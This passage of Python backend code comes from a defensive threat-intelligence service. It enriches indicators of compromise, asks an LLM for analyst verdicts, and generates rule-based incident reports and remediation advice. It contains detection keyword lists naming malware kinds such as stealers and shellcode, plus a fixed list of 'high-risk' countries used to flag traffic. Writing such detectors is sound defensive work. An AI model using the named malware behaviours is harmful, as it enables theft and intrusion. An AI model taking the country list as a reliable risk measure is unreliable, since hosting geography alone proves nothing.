    seen: set[str] = set()
    items: List[str] = []
    for entry in (req.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            tok = tok.strip()
            if not tok:
                continue
            key = tok.lower()
            if key in seen:
                continue
            seen.add(key)
            items.append(tok)
    if not items:
        raise HTTPException(status_code=400, detail="Provide at least one IOC to enrich")
    if len(items) > 20:
        items = items[:20]

    import time as _t
    t0 = _t.perf_counter()
    sem = asyncio.Semaphore(20)

    # For depth="free", strip reputation providers from the result. For
    # depth="ai", also generate a short Claude/Gemini verdict per IOC.
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        async def one(v: str) -> dict:
            async with sem:
                try:
                    r = await _do_lookup(hc, v)
                except Exception:
                    return {"value": v, "type": "unknown", "links": {},
                            "enrichment": None, "reputation": None,
                            "local_db": None, "ai_summary": None}
                if req.depth == "free":
                    r["reputation"] = None
                if req.depth == "ai" and EMERGENT_LLM_KEY and r.get("type") != "unknown":
                    # Build a compact enrichment context and ask for a 2-line
                    # SOC-analyst verdict. Cache in `ioc_ai_cache` (7 day TTL).
                    ck = _ioc_key(v)
                    try:
                        cached = await db.ioc_ai_cache.find_one({"_id": ck})
                        if cached and cached.get("ts") and (
                            datetime.now(timezone.utc) - datetime.fromisoformat(cached["ts"]) < _AI_TTL
                        ):
                            r["ai_summary"] = cached["summary"]
                            return r
                    except Exception:
                        pass
                    en = r.get("enrichment") or {}
                    ctx: dict = {"type": r.get("type"), "reputation": r.get("reputation"),
                                 "in_internal_database": r.get("local_db")}
                    if en.get("kind") == "ip":
                        ctx.update({"geo": en.get("geo"), "open_ports": en.get("open_ports"),
                                    "known_vulns": en.get("vulns"), "tags": en.get("tags")})
                    elif en.get("kind") == "web":
                        ctx.update({"resolved_ip": en.get("resolved_ip"), "geo": en.get("geo"),
                                    "urlscan_scan_count": en.get("scan_count")})
                    elif en.get("kind") == "hash":
                        ctx.update({"in_known_file_db": en.get("found"),
                                    "known_malicious": en.get("known_malicious"),
                                    "filename": en.get("filename")})
                    prompt = (f"IOC: {v}\nEnrichment (JSON):\n"
                              f"{json.dumps(ctx, default=str)[:3000]}")
                    try:
                        from emergentintegrations.llm.chat import LlmChat, UserMessage
                        chat = LlmChat(
                            api_key=EMERGENT_LLM_KEY,
                            session_id=f"ioc-{ck}",
                            system_message=_AI_SYSTEM,
                        ).with_model("gemini", "gemini-3-flash-preview")
                        resp = await chat.send_message(UserMessage(text=prompt))
                        summary = (resp if isinstance(resp, str) else str(resp)).strip()
                        r["ai_summary"] = summary
                        try:
                            await db.ioc_ai_cache.update_one(
                                {"_id": ck}, {"$set": {"summary": summary, "ts": now_iso()}}, upsert=True,
                            )
                        except Exception:
                            pass
                    except Exception as e:
                        logger.warning(f"cyberlab ai-summary failed for {v}: {e}")
                        r["ai_summary"] = None
                else:
                    r.setdefault("ai_summary", None)
                return r

        results = await asyncio.gather(*[one(v) for v in items])

    duration_ms = round((_t.perf_counter() - t0) * 1000, 2)

    # Roll up a compact summary for the report header.
    def _flagged(r: dict) -> bool:
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        ab = rep.get("abuseipdb") or {}
        vt_hits = (vt.get("malicious", 0) or 0) + (vt.get("suspicious", 0) or 0) if not vt.get("error") else 0
        ab_score = (ab.get("score", 0) or 0) if not ab.get("error") else 0
        return vt_hits > 0 or ab_score > 0
    flagged = sum(1 for r in results if _flagged(r))
    stats_snapshot = _perf_metrics.snapshot()
    return {
        "count": len(results),
        "flagged": flagged,
        "depth": req.depth,
        "duration_ms": duration_ms,
        "iocs_per_sec": round(len(results) / (duration_ms / 1000.0), 2) if duration_ms else 0.0,
        "cache_hit_rate": stats_snapshot["overall_cache_hit_rate"],
        "results": results,
    }


@api_router.get("/cyberlab/enrich-metrics")
async def cyberlab_enrich_metrics():
    """Expose per-provider performance metrics + cache stats."""
    return _perf_metrics.snapshot()


class AiSummaryInput(BaseModel):
    value: str



_AI_TTL = timedelta(days=7)
_AI_SYSTEM = (
    "You are a senior threat-intelligence analyst at a cybersecurity firm. "
    "Given an indicator of compromise (IOC) and its OSINT enrichment data, write a concise, factual "
    "threat assessment for a SOC analyst. Cover: what the indicator is, an overall risk verdict, the most "
    "notable context (reputation scores, geo, open ports, malware family/tags, whether it is in the internal "
    "database), and one clear recommended action. 4-6 sentences, plain prose, no markdown headings or bullet "
    "lists. Only use facts present in the provided data — never fabricate detections, names or attribution."
)


@api_router.get("/ai-config")
async def ai_config():
    return {"ai_enabled": bool(EMERGENT_LLM_KEY)}


@api_router.post("/ioc-ai-summary")
async def ioc_ai_summary(payload: AiSummaryInput):
    if not EMERGENT_LLM_KEY:
        raise HTTPException(status_code=503, detail="AI analysis is not configured")
    value = (payload.value or "").strip()
    if not value or _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Provide a valid IOC (hash, IP, domain or URL)")

    ck = _ioc_key(value)
    try:
        cached = await db.ioc_ai_cache.find_one({"_id": ck})
        if cached and cached.get("ts") and datetime.now(timezone.utc) - datetime.fromisoformat(cached["ts"]) < _AI_TTL:
            return {"summary": cached["summary"], "cached": True}
    except Exception:
        pass

    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        result = await _do_lookup(hc, value)

    en = result.get("enrichment") or {}
    ctx: dict = {"type": result.get("type"), "reputation": result.get("reputation"), "in_internal_database": result.get("local_db")}
    if en.get("kind") == "ip":
        ctx.update({"geo": en.get("geo"), "open_ports": en.get("open_ports"), "known_vulns": en.get("vulns"), "tags": en.get("tags")})
    elif en.get("kind") == "web":
        ctx.update({"resolved_ip": en.get("resolved_ip"), "geo": en.get("geo"), "open_ports": en.get("open_ports"), "urlscan_scan_count": en.get("scan_count"), "known_vulns": en.get("vulns")})
    elif en.get("kind") == "hash":
        ctx.update({"in_known_file_db": en.get("found"), "known_malicious": en.get("known_malicious"), "filename": en.get("filename")})

    prompt = f"IOC: {value}\nEnrichment data (JSON):\n{json.dumps(ctx, default=str)[:6000]}"

    try:
        from emergentintegrations.llm.chat import LlmChat, UserMessage
        chat = LlmChat(api_key=EMERGENT_LLM_KEY, session_id=f"ioc-{ck}", system_message=_AI_SYSTEM).with_model("gemini", "gemini-3-flash-preview")
        resp = await chat.send_message(UserMessage(text=prompt))
        summary = resp if isinstance(resp, str) else str(resp)
        summary = summary.strip()
    except Exception as e:
        logger.error(f"AI summary error: {e}")
        raise HTTPException(status_code=502, detail="AI analysis failed. Please try again.")

    try:
        await db.ioc_ai_cache.update_one({"_id": ck}, {"$set": {"summary": summary, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return {"summary": summary, "cached": False}


# ============================================================================
# Deterministic (offline, no LLM) OSINT summariser.
# Consumes batch enrichment results (same shape as /ioc-lookup-batch) and
# emits a factual, single-paragraph SOC-analyst-style summary. Also powers
# the NivX Forge "Investigation Report" tool below.
# ============================================================================

def _deterministic_ioc_summary(results: list[dict]) -> dict:
    """Produce a factual one-paragraph summary of a batch of IOC lookups.

    Rules only — no LLM. Uses VT/AbuseIPDB/geo/urlscan data present in each
    result. Returns {summary, stats}.
    """
    if not results:
        return {"summary": "No indicators were extracted from the provided input.",
                "stats": {"total": 0, "malicious": 0, "suspicious": 0, "clean": 0}}

    total = len(results)
    kinds: dict[str, int] = {}
    mal_hits: list[str] = []
    susp_hits: list[str] = []
    clean_hits: list[str] = []
    top_countries: dict[str, int] = {}
    families: set[str] = set()
    known_internal = 0

    for r in results:
        v = r.get("value") or ""
        t = r.get("type") or "unknown"
        kinds[t] = kinds.get(t, 0) + 1
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        ab = rep.get("abuseipdb") or {}
        vt_mal = (vt.get("malicious") or 0) if not vt.get("error") and vt.get("found") is not False else 0
        vt_susp = (vt.get("suspicious") or 0) if not vt.get("error") and vt.get("found") is not False else 0
        ab_score = (ab.get("score") or 0) if not ab.get("error") else 0
        if r.get("local_db"):
            known_internal += 1
        if vt_mal >= 1 or ab_score >= 50:
            mal_hits.append(v)
        elif vt_susp >= 1 or ab_score >= 20:
            susp_hits.append(v)
        else:
            clean_hits.append(v)
        en = r.get("enrichment") or {}
        geo = en.get("geo") or {}
        cc = geo.get("country") or geo.get("country_name")
        if cc:
            top_countries[cc] = top_countries.get(cc, 0) + 1
        for tag in (en.get("tags") or [])[:3]:
            families.add(str(tag))
        if vt.get("popular_threat_names"):
            for n in vt.get("popular_threat_names") or []:
                families.add(str(n))

    kind_bits = ", ".join(f"{c} {k}" for k, c in sorted(kinds.items(), key=lambda x: -x[1]) if k != "unknown")
    country_bits = ", ".join(f"{c} ({n})" for c, n in sorted(top_countries.items(), key=lambda x: -x[1])[:3])
    fam_bits = ", ".join(sorted(families)[:5])

    parts: list[str] = []
    parts.append(f"Analyzed {total} indicator{'s' if total != 1 else ''}" + (f" ({kind_bits})" if kind_bits else "") + ".")
    if mal_hits:
        head = ", ".join(mal_hits[:3])
        more = f" and {len(mal_hits) - 3} more" if len(mal_hits) > 3 else ""
        parts.append(f"{len(mal_hits)} indicator{'s' if len(mal_hits) != 1 else ''} scored MALICIOUS across the integrated OSINT feeds (VirusTotal / AbuseIPDB / MalwareBazaar / URLhaus / ThreatFox), notably {head}{more}.")
    if susp_hits:
        parts.append(f"{len(susp_hits)} additional indicator{'s' if len(susp_hits) != 1 else ''} returned suspicious signals but did not exceed the malicious threshold.")
    if clean_hits and not mal_hits and not susp_hits:
        parts.append("All indicators returned clean or unknown reputation on the enabled OSINT sources.")
    elif clean_hits:
        parts.append(f"The remaining {len(clean_hits)} indicator{'s' if len(clean_hits) != 1 else ''} returned clean or unknown reputation.")
    if known_internal:
        parts.append(f"{known_internal} indicator{'s' if known_internal != 1 else ''} already exist in the internal NivX IOC database.")
    if country_bits:
        parts.append(f"Observed hosting geography: {country_bits}.")
    if fam_bits:
        parts.append(f"Attributed threat context: {fam_bits}.")
    # Recommended action
    if mal_hits:
        parts.append("Recommended action: block the malicious indicators at the perimeter, hunt across EDR/SIEM for prior contact, and open an incident ticket for containment.")
    elif susp_hits:
        parts.append("Recommended action: watch-list the suspicious indicators, correlate with recent authentication and DNS logs, and re-check reputation in 24 hours.")
    else:
        parts.append("Recommended action: no immediate action; log the observation and continue routine monitoring.")

    return {
        "summary": " ".join(parts),
        "stats": {
            "total": total,
            "malicious": len(mal_hits),
            "suspicious": len(susp_hits),
            "clean": len(clean_hits),
            "known_internal": known_internal,
            "kinds": kinds,
        },
    }


class BatchSummaryInput(BaseModel):
    # Accept either the full results array (fast path) OR a list of raw
    # values (we'll run /ioc-lookup-batch internally). Either works.
    results: Optional[list[dict]] = None
    values: Optional[list[str]] = None


@api_router.post("/iocs/batch-summary")
async def iocs_batch_summary(payload: BatchSummaryInput):
    """Deterministic, offline OSINT summary paragraph for a batch of IOCs.

    * If `results` is provided, summarise them directly.
    * Otherwise resolve `values` via /ioc-lookup-batch first (capped at 50).
    """
    results = payload.results or []
    if not results and payload.values:
        # Reuse the batch lookup path.
        tokens: list[str] = []
        for entry in payload.values:
            for tok in re.split(r"[\s,;]+", (entry or "").strip()):
                tok = tok.strip()
                if tok:
                    tokens.append(tok)
        seen: set[str] = set()
        items: list[str] = []
        for t in tokens:
            k = t.lower()
            if k not in seen:
                seen.add(k)
                items.append(t)
        items = items[:50]
        if not items:
            raise HTTPException(status_code=400, detail="Provide IOCs to summarise")
        sem = asyncio.Semaphore(8)
        async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
            async def one(v: str) -> dict:
                async with sem:
                    try:
                        return await _do_lookup(hc, v)
                    except Exception:
                        return {"value": v, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
            results = await asyncio.gather(*[one(v) for v in items])
    if not results:
        raise HTTPException(status_code=400, detail="No IOCs to summarise")
    return _deterministic_ioc_summary(results)


# ---------------------------------------------------------------------------
# NivX Forge — Offline Investigation Report Generator (no LLM).
# Analyst-style two-paragraph MDR report from raw text/logs. Extracts IOCs,
# actors, timestamps, users/devices, actions; enriches IOCs via OSINT;
# then writes a deterministic report honouring the user's free-form
# instructions (paragraph count, tone hints).
# ---------------------------------------------------------------------------

_RE_IOC_URL     = re.compile(r"\bhttps?://[^\s\"'<>]+", re.I)
_RE_IOC_IP      = re.compile(r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\b")
_RE_IOC_HASH    = re.compile(r"\b[a-fA-F0-9]{32,128}\b")
_RE_IOC_DOMAIN  = re.compile(r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\[?\.\]?|\(\.\)))+[a-z]{2,24}\b", re.I)
_RE_TIMESTAMP   = re.compile(r"\b\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?\b")
_RE_USER_HINT   = re.compile(r"\b(?:user(?:name)?|account|login)\s*[:=]\s*([A-Za-z0-9._@\\-]+)", re.I)
_RE_EMAIL       = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
_RE_DEVICE_HINT = re.compile(r"\b(?:host(?:name)?|device|machine|workstation|computer)\s*[:=]\s*([A-Za-z0-9._-]+)", re.I)
_RE_ACTION_HINT = re.compile(r"\b(blocked|allowed|denied|quarantined|isolated|dropped|detected|executed|launched|created|deleted|modified|logon|logoff|failed login)\b", re.I)


def _extract_forge_iocs(raw: str) -> list[str]:
    found: dict[str, None] = {}
    for m in _RE_IOC_URL.finditer(raw):
        found[m.group(0).rstrip(".,;:)]")] = None
    for m in _RE_IOC_HASH.finditer(raw):
        h = m.group(0).lower()
        if len(h) in (32, 40, 64, 128):
            found[h] = None
    for m in _RE_IOC_IP.finditer(raw):
        found[m.group(0)] = None
    for m in _RE_IOC_DOMAIN.finditer(raw):
        refanged = m.group(0).replace("[.]", ".").replace("(.)", ".").lower()
        if refanged.count(".") == 3 and all(p.isdigit() for p in refanged.split(".")):
            continue  # skip pure IPs
        if len(refanged) < 4:
            continue
        found[refanged] = None
    return list(found.keys())


def _parse_forge_context(raw: str) -> dict:
    """Extract structured metadata from a raw log/text blob."""
    timestamps = _RE_TIMESTAMP.findall(raw)[:10]
    users = list({m.group(1) for m in _RE_USER_HINT.finditer(raw)})[:10]
    devices = list({m.group(1) for m in _RE_DEVICE_HINT.finditer(raw)})[:10]
    emails = list(dict.fromkeys(m.group(0) for m in _RE_EMAIL.finditer(raw)))[:10]
    actions_c: dict[str, int] = {}
    for m in _RE_ACTION_HINT.finditer(raw):
        w = m.group(1).lower()
        actions_c[w] = actions_c.get(w, 0) + 1
    top_actions = sorted(actions_c.items(), key=lambda x: -x[1])[:6]
    return {
        "timestamps": timestamps,
        "users": users,
        "devices": devices,
        "emails": emails,
        "actions": top_actions,
        "line_count": raw.count("\n") + 1,
        "char_count": len(raw),
    }


def _count_target_hits(raw: str, iocs: list[str]) -> dict[str, int]:
    """Count how many times each IOC appears in the raw corpus — proxies as
    the number of connections/queries to that target."""
    out: dict[str, int] = {}
    for v in iocs:
        try:
            out[v] = raw.lower().count(v.lower().replace("[.]", "."))
        except Exception:
            out[v] = 0
    return out


# ---------------------------------------------------------------------------
# Format parser — dynamic. Reads the user's free-form instruction and
# returns a spec describing how the report should be shaped.
#   mode:  "paragraphs" | "lines" | "sentences" | "bullets"
#   count: integer (1..20), or 0 for "natural"
#   verbose: bool — include every section without truncation
# ---------------------------------------------------------------------------

_NUMBER_WORDS = {"one": 1, "two": 2, "three": 3, "four": 4, "five": 5, "six": 6,
                 "seven": 7, "eight": 8, "nine": 9, "ten": 10}


def _parse_output_format(instructions: str) -> dict:
    """Read the free-form analyst prompt and produce a format spec.

    Supported hints (all case-insensitive, dynamic — no hard cap):
      "in N paragraphs" / "in N paras"
      "in N lines"
      "in N sentences"
      "bullet points" / "as bullets" / "in bullets"
      "with all details" / "without missing anything" → verbose
    """
    t = (instructions or "").lower()
    verbose = bool(re.search(r"\ball details|without missing|complete detail|comprehensive", t))
    # Bullet mode
    if re.search(r"\bbullet(?:\s*points)?\b|\bas\s*bullets?\b|\bin\s*bullets?\b", t):
        # Also allow "N bullets"
        m = re.search(r"\b(\d+)\s*bullet", t)
        n = int(m.group(1)) if m else 0
        return {"mode": "bullets", "count": max(0, min(n, 20)), "verbose": verbose}
    # Digit-based numeric hint
    for mode_kw, mode in [("para", "paragraphs"), ("line", "lines"), ("sentence", "sentences")]:
        m = re.search(rf"\b(\d+)\s*{mode_kw}", t)
        if m:
            return {"mode": mode, "count": max(1, min(int(m.group(1)), 20)), "verbose": verbose}
    # Word-based numeric hint
    for w, n in _NUMBER_WORDS.items():
        for mode_kw, mode in [("para", "paragraphs"), ("line", "lines"), ("sentence", "sentences")]:
            if re.search(rf"\b{w}\s*{mode_kw}", t):
                return {"mode": mode, "count": n, "verbose": verbose}
    # Default: 2 paragraphs (analyst norm)
    return {"mode": "paragraphs", "count": 2, "verbose": verbose}


# ---------------------------------------------------------------------------
# Case classification & remediation templates. Deterministic branch:
#   - "malware"    → file hash or endpoint keywords present
#   - "dns_proxy"  → only URLs/domains + proxy/DNS keywords
#   - "mixed"      → both signals
#   - "generic"    → neither
# ---------------------------------------------------------------------------

_MALWARE_KEYWORDS = ("malware", "trojan", "ransomware", "backdoor", "worm",
                     "spyware", "stealer", "rootkit", "loader", "dropper",
                     "endpoint", "edr", "amsi", "shellcode")
_DNSPROXY_KEYWORDS = ("umbrella", "secure access", "cisco umbrella", "zscaler",
                      "bluecoat", "netskope", "proxy", "dns", "web filter",
                      "url filter", "dns query", "dns request", "cname")


def _classify_forge_case(raw: str, iocs: list[str], enriched: list[dict]) -> str:
    t = raw.lower()
    has_hash = any(_classify_ioc(v) in ("md5", "sha1", "sha256") for v in iocs)
    has_url_dom = any(_classify_ioc(v) in ("url", "domain") for v in iocs)
    kw_mal = any(k in t for k in _MALWARE_KEYWORDS)
    kw_dp = any(k in t for k in _DNSPROXY_KEYWORDS)
    if has_hash and (has_url_dom or kw_dp):
        return "mixed"
    if has_hash or kw_mal:
        return "malware"
    if has_url_dom or kw_dp:
        return "dns_proxy"
    return "generic"


# ---------------------------------------------------------------------------
# Dynamic recommendations engine.
# The final recommendation list is *composed* from the specific detection
# findings — never a fixed template. Every case therefore produces a
# different, evidence-grounded list of actions.
#
# Signals it reads:
#   - `case_type`                                (malware / dns_proxy / mixed / generic)
#   - `verdict_counts`      (mal / susp / clean)  from OSINT rollup
#   - `action_c`            (blocked / allowed / …) parsed from the raw text
#   - per-IOC enriched data:
#       * VT categories        (malware / phishing / c2 / cryptomining / spyware / …)
#       * VT popular threat names
#       * VT malicious count
#       * AbuseIPDB score
#       * Hosting country
#   - hash / URL / IP / domain split of the extracted IOCs
#   - repeat volume            (× N connection count from `_count_target_hits`)
#   - multi-user / multi-device signals
# ---------------------------------------------------------------------------

_HIGH_RISK_COUNTRIES = {"RU", "CN", "KP", "IR", "BY", "SY", "Russia", "China",
                        "North Korea", "Iran", "Belarus", "Syria"}


def _summarize_categories(enriched: list[dict]) -> dict[str, list[str]]:
    """Map VT/OSINT category → list of IOC values that triggered it."""
    out: dict[str, list[str]] = {}
    for r in enriched or []:
        v = r.get("value")
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        cats = vt.get("categories") or {}
        # cats is typically dict of {engine: category}
        vals = cats.values() if isinstance(cats, dict) else (cats if isinstance(cats, list) else [])
        for c in vals:
            key = str(c).lower()
            out.setdefault(key, [])
            if v and v not in out[key]:
                out[key].append(v)
        for tag in (vt.get("popular_threat_names") or []):
            key = str(tag).lower()
            out.setdefault(key, [])
            if v and v not in out[key]:
                out[key].append(v)
    return out


def _dynamic_recommendations(case_type: str,
                             raw: str,
                             iocs: list[str],
                             enriched: list[dict],
                             context: dict,
                             stats: dict) -> list[str]:
    """Compose a finding-driven, evidence-grounded recommendation list.

    Rules fire only when their trigger is present in the detection data.
    Same case_type on two different detections produces two different lists.
    """
    recs: list[str] = []

    # ---- Split IOCs by kind for targeted advice ----
    hashes = [v for v in iocs if _classify_ioc(v) in ("md5", "sha1", "sha256")]
    ips = [v for v in iocs if _classify_ioc(v) == "ip"]
    urls = [v for v in iocs if _classify_ioc(v) == "url"]
    domains = [v for v in iocs if _classify_ioc(v) == "domain"]

    # ---- Signals from action tallies ----
    action_c = dict(context.get("actions") or [])
    blocked = int(action_c.get("blocked", 0))
    allowed = int(action_c.get("allowed", 0))
    denied = int(action_c.get("denied", 0))
    detected = int(action_c.get("detected", 0))
    quarantined = int(action_c.get("quarantined", 0))
    dropped = int(action_c.get("dropped", 0))
    isolated = int(action_c.get("isolated", 0))

    # ---- OSINT verdict counts ----
    mal = int(stats.get("malicious") or 0)
    susp = int(stats.get("suspicious") or 0)

    # ---- Per-IOC verdict lookup (build lists of "confirmed malicious" IOCs) ----
    mal_hashes: list[str] = []
    mal_urls_domains: list[str] = []
    mal_ips: list[str] = []
    high_ab_ips: list[str] = []
    hosting_countries: dict[str, int] = {}
    for r in enriched or []:
        v = r.get("value") or ""
        t = r.get("type")
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        ab = rep.get("abuseipdb") or {}
        vt_mal = (vt.get("malicious") or 0) if not vt.get("error") else 0
        vt_susp = (vt.get("suspicious") or 0) if not vt.get("error") else 0
        ab_score = (ab.get("score") or 0) if not ab.get("error") else 0
        if vt_mal >= 1 or ab_score >= 50:
            if t in ("md5", "sha1", "sha256"):
                mal_hashes.append(v)
            elif t == "ip":
                mal_ips.append(v)
            elif t in ("url", "domain"):
                mal_urls_domains.append(v)
        if ab_score >= 50 and t == "ip":
            high_ab_ips.append(v)
        _ = vt_susp  # reserved for future use
        en = r.get("enrichment") or {}
        geo = en.get("geo") or {}
        cc = geo.get("country_code") or geo.get("country") or geo.get("country_name")
        if cc:
            hosting_countries[str(cc)] = hosting_countries.get(str(cc), 0) + 1

    # ---- Category signals from VT (phishing / c2 / cryptomining / spyware / malware) ----
    cats = _summarize_categories(enriched)
    def _cat_iocs(*names: str) -> list[str]:
        seen: dict[str, None] = {}
        for name in names:
            for k, vals in cats.items():
                if name in k:
                    for v in vals:
                        seen[v] = None
        return list(seen.keys())

    phishing_iocs = _cat_iocs("phish")
    c2_iocs = _cat_iocs("c2", "command-and-control", "command and control")
    cryptomining_iocs = _cat_iocs("mining", "coinminer", "cryptomin")
    spyware_iocs = _cat_iocs("spyware", "stealer", "infostealer")
    malware_cat_iocs = _cat_iocs("malware", "trojan", "ransom", "loader", "dropper")

    # ---- Repeat volume ----
    hit_counts = _count_target_hits(raw, iocs)
    heavy_targets = [v for v, c in hit_counts.items() if c >= 5]

    # ---- Multi-user / multi-device ----
    devices = context.get("devices") or []
    users = context.get("users") or []
    emails = context.get("emails") or []
    n_devices = len(set(devices))
    n_identities = len(set(users) | set(emails))

    # ==========================================================
    # RULE 1 — Authorized/expected check (always first, phrased once).
    # ==========================================================
    recs.append("Determine whether the observed activity was authorized or expected for this asset and user before treating it as an incident.")

    # ==========================================================
    # RULE 2 — Traffic that was ALLOWED to reach a malicious destination
    # is the most urgent finding. Fires only when we see allowed OR when
    # OSINT flagged malicious but nothing was blocked.
    # ==========================================================
    if allowed > 0 and (mal_urls_domains or mal_ips):
        listed = ", ".join((mal_urls_domains + mal_ips)[:5])
        recs.append(f"URGENT — {allowed} connection(s) were ALLOWED to destinations that OSINT has confirmed malicious ({listed}). Block these indicators at the DNS/proxy layer immediately and hunt the affected host in EDR/SIEM for post-compromise activity.")
    elif blocked == 0 and (denied + dropped) == 0 and (mal_urls_domains or mal_ips):
        listed = ", ".join((mal_urls_domains + mal_ips)[:5])
        recs.append(f"No perimeter enforcement was observed for the following confirmed-malicious destinations: {listed}. Add explicit deny rules in the DNS/proxy layer and validate they are enforced network-wide.")

    # ==========================================================
    # RULE 3 — Quarantined hashes: confirm quarantine + hunt for laterality.
    # ==========================================================
    if quarantined > 0 and hashes:
        recs.append(f"Confirm the quarantine of the {len(hashes)} identified file hash(es) is effective on the source endpoint, then sweep the wider fleet for the same hash(es) using EDR live-response — quarantine on one host does not imply the sample is absent elsewhere.")

    # ==========================================================
    # RULE 4 — Malicious hashes not yet contained.
    # ==========================================================
    if mal_hashes and quarantined == 0:
        recs.append(f"Remove the malicious executable(s) {', '.join(mal_hashes[:5])} from the affected host, submit to your sandbox for behavioural context, and add SHA-256 to the EDR block list.")

    # ==========================================================
    # RULE 5 — Detected but not blocked (visibility, no enforcement).
    # ==========================================================
    if detected > 0 and blocked == 0 and denied == 0 and quarantined == 0:
        recs.append(f"The security stack DETECTED {detected} event(s) but no automated enforcement (block/deny/quarantine) was recorded — verify your policy is set to enforce, not merely alert, for the categories triggered here.")

    # ==========================================================
    # RULE 6 — Category-specific playbooks.
    # ==========================================================
    if phishing_iocs:
        who = users[0] if users else (emails[0] if emails else "the affected user")
        recs.append(f"Phishing category matched on {', '.join(phishing_iocs[:3])} — reset credentials and refresh MFA seed for {who}, invalidate active sessions, and search mail-flow logs for the delivering message.")
    if c2_iocs:
        recs.append(f"Command-and-Control category matched on {', '.join(c2_iocs[:3])} — treat the source host as compromised: network-isolate the asset, preserve volatile memory, and initiate incident response.")
    if cryptomining_iocs:
        recs.append(f"Cryptomining category matched on {', '.join(cryptomining_iocs[:3])} — enable the Cryptomining threat category in Secure Access/Umbrella, then audit CPU baselines on the host for unauthorized miner persistence.")
    if spyware_iocs:
        recs.append(f"Spyware/infostealer traits matched on {', '.join(spyware_iocs[:3])} — rotate any credentials, session tokens or browser cookies stored on the affected asset; assume they are exfiltrated until proven otherwise.")
    if malware_cat_iocs and not mal_hashes:
        recs.append(f"OSINT tagged {', '.join(malware_cat_iocs[:3])} in the malware/trojan/ransomware category — pivot on these destinations in your DNS/proxy history to identify every internal source that has contacted them.")

    # ==========================================================
    # RULE 7 — High-abuse IP score.
    # ==========================================================
    if high_ab_ips:
        recs.append(f"AbuseIPDB reports ≥50% abuse confidence for {', '.join(high_ab_ips[:3])} — add these IPs to the firewall blocklist and correlate against inbound authentication attempts.")

    # ==========================================================
    # RULE 8 — Hosting geography risk.
    # ==========================================================
    risky = [c for c in hosting_countries if c in _HIGH_RISK_COUNTRIES]
    if risky:
        recs.append(f"Destination hosting resolved to {', '.join(risky[:3])} — where business justification is absent, add these ASNs/geographies to the enhanced-monitoring watchlist.")

    # ==========================================================
    # RULE 9 — Repeat volume.
    # ==========================================================
    if heavy_targets:
        recs.append(f"High repeat volume observed against {', '.join(heavy_targets[:3])} (≥5 references in the corpus) — review DNS/proxy history 30 days back to establish first-contact and identify any period when the destinations were NOT blocked.")

    # ==========================================================
    # RULE 10 — Multi-identity / multi-device blast-radius.
    # ==========================================================
    if n_devices >= 2:
        recs.append(f"Activity spans {n_devices} distinct endpoints — broadcast the IOC block-list network-wide (do not scope containment to the source host) and prioritise fleet-wide EDR sweep.")
    if n_identities >= 2:
        recs.append(f"Activity involves {n_identities} distinct identities — check for shared credentials or a common phishing vector, and initiate an org-wide password rotation for the affected group.")

    # ==========================================================
    # RULE 11 — Case-shape hygiene (only *if not already covered above*).
    # ==========================================================
    if case_type in ("malware", "mixed") and not mal_hashes and not quarantined:
        recs.append("Run a full antivirus/EDR scan on the affected system and review Autoruns, Scheduled Tasks and WMI subscriptions for persistence artefacts.")
    if case_type in ("dns_proxy", "mixed"):
        if not phishing_iocs and not c2_iocs and not cryptomining_iocs:
            recs.append("Confirm the Malware, Phishing, Command-and-Control and Cryptomining categories are all enforced in your Secure Access/Umbrella profile for this user group.")
        if allowed > 0:
            recs.append("Remove any unauthorized browser extensions/plugins on the source device and clear browser cache/cookies to eliminate hijack-carrier state.")

    # ==========================================================
    # RULE 12 — Nothing malicious found — down-tune the response.
    # ==========================================================
    if mal == 0 and susp == 0 and not phishing_iocs and not c2_iocs:
        recs.append("No OSINT source flagged the extracted indicators as malicious — record the observation for the audit trail and continue baseline monitoring; no customer-side containment is required at this time.")

    # ==========================================================
    # RULE 13 — Universal hygiene closer (only added if there is anything
    # actionable above beyond the authorization check).
    # ==========================================================
    if len(recs) > 1:
        recs.append("Confirm endpoint protection signatures and operating-system patches are current on the affected asset, and validate offsite backups are recent and restorable.")

    # De-duplicate while preserving order.
    seen: set[str] = set()
    unique: list[str] = []
    for r in recs:
        if r not in seen:
            seen.add(r)
            unique.append(r)
    return unique


# ---------------------------------------------------------------------------
# 5W1H narrative builder — deterministic sentences describing the incident.
# Each returns a list of factual, self-contained sentences that the composer
# can slice/pack into paragraphs, lines or bullets depending on the format.
# ---------------------------------------------------------------------------

def _forge_5w1h_sentences(raw: str, iocs: list[str],
                          enriched: list[dict],
                          context: dict,
                          case_type: str) -> dict[str, list[str]]:
    hits = _count_target_hits(raw, iocs)
    ts = context.get("timestamps") or []
    ts_first, ts_last = (ts[0], ts[-1]) if ts else (None, None)
    devices = context.get("devices") or []
    users = context.get("users") or []
    emails = context.get("emails") or []
    action_c = dict(context.get("actions") or [])
    blocked = action_c.get("blocked", 0)
    allowed = action_c.get("allowed", 0)
    denied = action_c.get("denied", 0)
    detected = action_c.get("detected", 0)
    dropped = action_c.get("dropped", 0)
    quarantined = action_c.get("quarantined", 0)

    who_bits: list[str] = []
    if users:
        who_bits.append(f"user {', '.join(users[:3])}")
    if emails and not users:
        who_bits.append(f"user account {', '.join(emails[:2])}")
    if devices:
        who_bits.append(f"device{'s' if len(devices) != 1 else ''} {', '.join(devices[:3])}")
    who = "; ".join(who_bits) or "the affected identity"

    when_bit = (
        f"between {ts_first} and {ts_last} UTC" if ts_first and ts_last and ts_first != ts_last
        else (f"at {ts_first} UTC" if ts_first else "at the timestamps present in the corpus")
    )

